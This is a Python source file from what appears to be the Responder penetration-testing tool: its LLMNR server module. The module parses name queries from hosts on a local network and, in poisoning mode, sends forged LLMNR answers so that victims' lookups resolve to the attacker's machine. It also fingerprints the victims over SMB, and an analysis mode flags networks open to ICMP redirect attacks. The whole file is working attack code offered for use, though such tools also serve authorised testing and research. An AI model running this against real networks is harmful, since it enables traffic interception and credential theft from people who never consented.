#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import socket
import struct
import settings
import fingerprint

from packets import LLMNR_Ans
from odict import OrderedDict
from SocketServer import BaseRequestHandler
from utils import *

def Parse_LLMNR_Name(data):
	NameLen = struct.unpack('>B',data[12])[0]
	Name = data[13:13+NameLen]
	return Name

def IsOnTheSameSubnet(ip, net):
	net = net+'/24'
	ipaddr = int(''.join([ '%02x' % int(x) for x in ip.split('.') ]), 16)
	netstr, bits = net.split('/')
	netaddr = int(''.join([ '%02x' % int(x) for x in netstr.split('.') ]), 16)
	mask = (0xffffffff << (32 - int(bits))) & 0xffffffff
	return (ipaddr & mask) == (netaddr & mask)

def IsICMPRedirectPlausible(IP):
	dnsip = []
	for line in file('/etc/resolv.conf', 'r'):
		ip = line.split()
		if len(ip) < 2:
		   continue
		if ip[0] == 'nameserver':
			dnsip.extend(ip[1:])
	for x in dnsip:
		if x !="127.0.0.1" and IsOnTheSameSubnet(x,IP) == False:
			print color("[Analyze mode: ICMP] You can ICMP Redirect on this network.", 5)
			print color("[Analyze mode: ICMP] This workstation (%s) is not on the same subnet than the DNS server (%s)." % (IP, x), 5)
			print color("[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.", 5)
		else:
			pass

if settings.Config.AnalyzeMode:
	IsICMPRedirectPlausible(settings.Config.Bind_To)

# LLMNR Server class
class LLMNR(BaseRequestHandler):

	def handle(self):
		data, soc = self.request
		Name = Parse_LLMNR_Name(data)

		# Break out if we don't want to respond to this host
		if RespondToThisHost(self.client_address[0], Name) is not True:
			return None

		if data[2:4] == "\x00\x00" and Parse_IPV6_Addr(data):

			if settings.Config.Finger_On_Off:
				Finger = fingerprint.RunSmbFinger((self.client_address[0], 445))
			else:
				Finger = None

			# Analyze Mode
			if settings.Config.AnalyzeMode:
				LineHeader = "[Analyze mode: LLMNR]"
				print color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0], Name), 2, 1)

			# Poisoning Mode
			else:
				Buffer = LLMNR_Ans(Tid=data[0:2], QuestionName=Name, AnswerName=Name)
				Buffer.calculate()
				soc.sendto(str(Buffer), self.client_address)
				LineHeader = "[*] [LLMNR]"

				print color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0], Name), 2, 1)

			if Finger is not None:
				print text("[FINGER] OS Version     : %s" % color(Finger[0], 3))
				print text("[FINGER] Client Version : %s" % color(Finger[1], 3))
